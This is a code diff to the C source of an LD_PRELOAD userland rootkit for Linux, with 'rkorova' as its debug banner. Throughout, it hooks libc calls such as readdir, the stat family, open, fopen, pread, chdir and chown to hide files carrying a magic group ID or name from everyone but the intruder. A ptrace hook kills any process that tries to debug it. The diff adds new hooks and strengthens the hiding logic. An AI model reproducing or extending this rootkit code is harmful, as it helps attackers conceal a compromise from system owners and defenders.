@@ -35,8 +35,8 @@ struct dirent *(*old_readdir)(DIR *dirp);
 struct dirent64 *(*old_readdir64)(DIR *dirp);
 int (*old_chdir)(const char *path);
 int (*old_fchdir)(int fildes); 
-int (*old_mkdir)(const char *pathname, mode_t mode); 
-int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
+int (*old_mkdir)(const char *pathname, ...); 
+int (*old_mkdirat)(int dirfd, const char *pathname, ...);
 int (*old_rmdir)(const char *pathname); 
 DIR *(*old_opendir)(const char *name);
 DIR *(*old_opendir64)(const char *name);
@@ -55,14 +55,18 @@ int (*old_open64)(const char *file, int oflag, ...);
 int (*old_openat)(int fd, const char *path, int oflag, ...);
 int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
 FILE *(*old_fopen)(const char *pathname, const char *mode); 
+FILE *(*old_fopen64)(const char *pathname, const char *mode);
 
 //read 
 size_t (*old_fread)(void *ptr, size_t size, size_t nmemb, FILE *stream); 
+ssize_t (*old_pread)(int fd, void *buf, size_t count, off_t offset);
+ssize_t (*old_pread64)(int fd, void *buf, size_t count, off64_t offset);
 
 //write
 int (*old_creat)(const char *path, mode_t mode);
 int (*old_fputs)(const char *s, FILE *stream);
 size_t (*old_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
+ssize_t (*old_pwrite)(int fd, const void *buf, size_t count, off_t offset); 
 
 //file naming functions 
 int (*old_rename)(const char *oldpath, const char *newpath);
@@ -75,6 +79,7 @@ int (*old___xstat)(int ver, const char *path, struct stat *buf);
 int (*old___lxstat)(int ver, const char *path, struct stat *buf); 
 int (*old___fxstat)(int ver, int fildes, struct stat *buf);
 int (*old_fstat)(int fildes, struct stat *buf); 
+int (*old_fstat64)(int fd, struct stat64 *buf);
 int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
 int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
 int (*old___xstat64)(int ver, const char *path, struct stat64 *buf); 
@@ -97,6 +102,8 @@ struct passwd *(*old_getpwuid)(uid_t uid);
 int (*old_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result); 
 struct spwd *(*old_getspnam)(char *name); 
 
+void *libc;
+
 int owned(void)
 { 
 	int x;
@@ -111,12 +118,14 @@ int owned(void)
 	return x; 
 } 
 
-void __attribute ((constructor)) init(void)
+__attribute__ ((constructor)) static void init(void)
 { 
 	#ifdef DEBUG
-	printf("==========LOADED==========\n");
-	#endif 
-} 
+	printf("rkorova loaded.\n");
+	printf("\n");
+	#endif
+	libc = dlopen(LIBC, RTLD_LAZY);
+}
 
 long int ptrace(enum __ptrace_request request, ...)
 {
@@ -129,17 +138,6 @@ long int ptrace(enum __ptrace_request request, ...)
 	printf("%s\n", msg); 
 	exit(-1);
 }
-
-int execve(const char *path, char *const argv[], char *const envp[])
-{
-	HOOK(execve);
-	HOOK(__xstat);
-	#ifdef DEBUG 
-	printf("[!] execve hooked"); 
-	#endif
-	if (owned()) return old_execve(path, argv, envp); 
-	return old_execve(path, argv, envp); 
-}		       	
 
 off_t lseek(int fildes, off_t offset, int whence)
 { 
@@ -246,7 +244,10 @@ int __lxstat(int ver, const char *path, struct stat *buf)
 	#ifdef DEBUG 
 	printf("[!] lxstat hooked\n"); 
 	#endif 
-
+	if(!libc)
+		libc = dlopen(LIBC, RTLD_LAZY); 
+	if (old___lxstat == NULL)
+		old___lxstat = dlsym(libc, "__lxstat");
 	if (owned())
 	{
 		return old___lxstat(ver, path, buf); 
@@ -272,6 +273,10 @@ int __fxstat(int ver, int fildes, struct stat *buf)
 	printf("[!] fxstat hooked\n"); 
 	#endif 
 
+	if(!libc)
+		libc = dlopen(LIBC, RTLD_LAZY); 
+	if (old___fxstat == NULL)
+		old___fxstat = dlsym(libc, "__fxstat");
 	if (owned())
 	{ 
 		return old___fxstat(ver, fildes, buf); 
@@ -296,6 +301,7 @@ int lstat(const char *pathname, struct stat *buf)
 	#ifdef DEBUG 
 	printf("[!] lstat hooked"); 
 	#endif
+	
 	struct stat filestat; 
 	memset(&filestat, 0x00, sizeof(filestat));
 	if (owned()) return old_lstat(pathname, buf); 
@@ -317,6 +323,7 @@ int fstat(int fildes, struct stat *buf)
 	#ifdef DEBUG 
 	printf("[!] fstat hooked\n"); 
 	#endif
+	
 	struct stat filestat;
         memset(&filestat, 0x00, sizeof(filestat));	
 	if (owned()) return old_fstat(fildes, buf); 
@@ -328,6 +335,24 @@ int fstat(int fildes, struct stat *buf)
 	}
 	return old_fstat(fildes, buf);
 }
+
+int fstat64(int fd, struct stat64 *buf) 
+{ 
+	HOOK(fstat64); 
+	#ifdef DEBUG
+	printf("[!] fstat64\n"); 
+	#endif 
+	struct stat64 filestat; 
+	memset(&filestat, 0x00, sizeof(filestat)); 
+	if (owned()) return old_fstat64(fd, buf); 
+	old_fstat64(fd, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		errno = ENOENT; 
+		return -1; 
+	}
+	return old_fstat64(fd, buf); 
+} 
 
 int fstatat(int fd, const char *restrict path, struct stat *restrict buf, int flag)
 {
@@ -547,7 +572,6 @@ size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 	char *magic = strdup(MAGIC); xor(magic); 
 	if (strstr(ptr, magic))
 	{ 
-		CLEAN(magic); 
 		return 0; 
 	} 
 	CLEAN(magic); 
@@ -619,20 +643,20 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
 struct dirent *readdir(DIR *dirp)
 { 
 	HOOK(readdir);
-	HOOK(__xstat);
+	HOOK(fstat);
 	#ifdef DEBUG 
 	printf("[!] readdir hooked\n"); 
 	#endif
 	
-	char *magic = strdup(MAGIC); xor(magic); 
-	char path[PATH_MAX + 1];
+	char path[PATH_MAX + 1]; 
 	struct dirent *dir; 
-	struct stat filestat; 	
+	struct stat filestat; 
+	char *magic = strdup(MAGIC); xor(magic);
 	if (owned()) return old_readdir(dirp); 
-	do
+	do 
 	{ 
 		dir = old_readdir(dirp); 
-		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, "/\0") == 0))
+		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, ".\0") == 0))
 			continue; 
 		if (dir != NULL)
 		{ 
@@ -644,10 +668,10 @@ struct dirent *readdir(DIR *dirp)
 			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
 			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
 			old___xstat(_STAT_VER, path, &filestat); 
-		}
-	}while (dir && (filestat.st_gid == MAGICGID)); 
-	CLEAN(magic); 	
-	return dir;	
+		} 
+	} while (dir && ((filestat.st_gid == MAGICGID)||(strstr(path, magic) != NULL))); 
+	CLEAN(magic);
+	return dir; 
 } 
 
 struct dirent64 *readdir64(DIR *dirp)
@@ -661,6 +685,7 @@ struct dirent64 *readdir64(DIR *dirp)
 	char path[PATH_MAX + 1]; 
 	struct dirent64 *dir; 
 	struct stat64 filestat; 
+	char *magic = strdup(MAGIC); xor(magic);
 	if (owned()) return old_readdir64(dirp); 
 	do 
 	{ 
@@ -678,9 +703,11 @@ struct dirent64 *readdir64(DIR *dirp)
 			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
 			old___xstat64(_STAT_VER, path, &filestat); 
 		} 
-	}while (dir && filestat.st_gid == MAGICGID); 
+	} while (dir && ((filestat.st_gid == MAGICGID)||strstr(path, magic) != NULL)); 
+	CLEAN(magic);
 	return dir; 
 }
+
 
 int chdir(const char *path)
 { 
@@ -694,7 +721,7 @@ int chdir(const char *path)
 	old___xstat(_STAT_VER, path, &filestat);	
 	if (owned()) return old_chdir(path);
 	char *magic = strdup(MAGIC); xor(magic);
-	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
+	if (strstr(path, magic) != NULL || (filestat.st_gid == MAGICGID))
 	{
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -704,7 +731,7 @@ int chdir(const char *path)
 	return old_chdir(path);
 } 
 
-int fchdir(int fildes)
+int fchdir(int fd)
 { 
 	HOOK(fchdir); 
 	HOOK(fstat); 
@@ -712,18 +739,18 @@ int fchdir(int fildes)
 	printf("[!] fchdir hooked\n"); 
 	#endif
 
-	if (owned()) return old_fchdir(fildes); 
+	if (owned()) return old_fchdir(fd);
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
-	old_fstat(fildes, &filestat); 
+	old_fstat(fd, &filestat);
 	if (filestat.st_gid == MAGICGID)
 	{ 
 		CLEAN(magic);
-		errno = EBADF; 
+		errno = ENOENT; 
 		return -1; 
 	}
 	CLEAN(magic); 
-	return old_fchdir(fildes);
+	return old_fchdir(fd);
 }
 
 int mkdir(const char *pathname, mode_t mode)
@@ -787,14 +814,13 @@ int rmdir(const char *pathname)
 		errno = ENOENT; 
 		return -1;
 	}
-	CLEAN(magic);
 	return old_rmdir(pathname); 
 }
 
 DIR *fdopendir(int fd)
 { 
 	HOOK(fdopendir);
-	HOOK(__fxstat);
+	HOOK(fstat);
 	#ifdef DEBUG 
 	printf("[!] fdopendir hooked\n"); 
 	#endif 
@@ -802,7 +828,7 @@ DIR *fdopendir(int fd)
 	if (owned()) return old_fdopendir(fd); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
-	old___fxstat(_STAT_VER, fd, &filestat); 
+	old_fstat(fd, &filestat); 
 	if (filestat.st_gid == MAGICGID)
 	{
 		CLEAN(magic); 
@@ -885,7 +911,7 @@ int open64(const char *file, int oflag, ...)
 	HOOK(__xstat64); 
 	#ifdef DEBUG 
 	printf("[!] open64 hooked\n"); 
-	#endif 
+	#endif
 
 	if (owned()) return old_open64(file, oflag); 
 	char *magic = strdup(MAGIC); xor(magic); 
@@ -898,7 +924,7 @@ int open64(const char *file, int oflag, ...)
 		return -1; 
 	}
 	CLEAN(magic); 
-	return old_open(file, oflag); 
+	return old_open64(file, oflag); 
 }
 
 int openat(int fd, const char *path, int oflag, ...)
@@ -922,6 +948,46 @@ int openat(int fd, const char *path, int oflag, ...)
 	CLEAN(magic);
 	return old_openat(fd, path, oflag);
 }
+
+ssize_t pread(int fd, void *buf, size_t count, off_t offset) 
+{ 
+	HOOK(pread); 
+	HOOK(fstat); 
+	#ifdef DEBUG
+	printf("[!] pread hooked\n"); 
+	#endif 
+
+	if (owned()) return old_pread(fd, buf, count, offset); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old_fstat(fd, &filestat);
+	if (filestat.st_gid == MAGICGID) 
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	} 
+	CLEAN(magic); 
+	return old_pread(fd, buf, count, offset); 
+} 
+
+ssize_t pread64(int fd, void *buf, size_t count, off64_t offset)
+{ 
+	HOOK(pread64); 
+	HOOK(fstat64); 	
+	if (owned()) return old_pread64(fd, buf, count, offset); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat64 filestat; 
+	memset(&filestat, 0x00, sizeof(filestat)); 
+	old_fstat64(fd, &filestat); 
+	if (filestat.st_gid == MAGICGID) 
+	{ 
+		CLEAN(magic); 
+		return -1; 
+	} 
+	CLEAN(magic); 
+	return old_pread64(fd, buf, count, offset); 
+} 
 
 int access(const char *pathname, int mode)
 { 
@@ -956,7 +1022,7 @@ FILE *fopen(const char *pathname, const char *mode)
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
 	old___xstat(_STAT_VER, pathname, &filestat); 
-	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
+	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
 	{
 		CLEAN(magic);
 		errno = ENOENT;
@@ -966,16 +1032,40 @@ FILE *fopen(const char *pathname, const char *mode)
 	return old_fopen(pathname, mode);
 }	
 
+FILE *fopen64(const char *pathname, const char *mode)
+{ 
+	HOOK(fopen64); 
+	HOOK(__xstat64); 
+	#ifdef DEBUG
+	printf("[!] fopen64 hooked\n"); 
+	#endif
+
+	if (owned()) return old_fopen64(pathname, mode); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat64 filestat; 
+	old___xstat64(_STAT_VER, pathname, &filestat); 
+	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return NULL; 
+	} 
+	CLEAN(magic); 
+	return old_fopen64(pathname, mode); 
+} 
+
+
 char *fgets(char *s, int size, FILE *stream)
 { 
 
-	struct stat filestat;
 	HOOK(fgets); 
 	HOOK(__xstat);
         HOOK(access);	
 	#ifdef DEBUG 
 	printf("[!] fgets hooked\n"); 
 	#endif
+	
+	struct stat filestat;
 	char *p = old_fgets(s, size, stream);
 	if (p == NULL)
 		return(p);
@@ -1011,7 +1101,7 @@ int chmod(const char *path, mode_t mode)
 	old___xstat(_STAT_VER, path, &filestat);	
         if (owned()) return old_chmod(path, mode); 	
 	char *magic = strdup(MAGIC); xor(magic);
-	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
+	if ((strstr(path, magic) != NULL ) || filestat.st_gid == MAGICGID)
 	{
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -1046,13 +1136,16 @@ int fchmod(int fd, mode_t mode)
 int chown(const char *pathname, uid_t owner, gid_t group)
 { 
 	HOOK(chown); 
+	HOOK(__lxstat);
 	#ifdef DEBUG 
 	printf("[!] chown hooked\n"); 
 	#endif 
 
 	if (owned()) return old_chown(pathname, owner, group); 
+	struct stat filestat; 
+	old___lxstat(_STAT_VER, pathname, &filestat);
 	char *magic = strdup(MAGIC); xor(magic); 
-	if (strstr(pathname, magic))
+	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
 	{ 
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -1124,4 +1217,3 @@ struct passwd *getpwent(void)
 	} 
 	return pw; 
 }
-
